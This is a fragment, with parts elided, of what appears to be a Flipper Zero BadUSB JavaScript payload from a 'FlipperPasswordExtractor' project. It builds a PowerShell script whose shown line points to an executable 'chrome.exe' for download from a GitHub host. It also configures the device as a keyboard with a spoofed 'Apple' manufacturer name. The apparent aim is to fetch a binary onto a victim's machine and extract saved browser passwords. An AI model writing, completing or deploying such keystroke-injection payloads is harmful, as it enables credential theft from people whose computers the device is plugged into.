...
let script = [
    ...
    "$chromeExeUrl = 'https://github.com/RiadZX/FlipperPasswordExtractor/raw/master/build/chrome.exe';", // URL of the Chrome executable
...
// VID&PID as HID
badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfr_name: "Apple", prod_name: "Sux" });
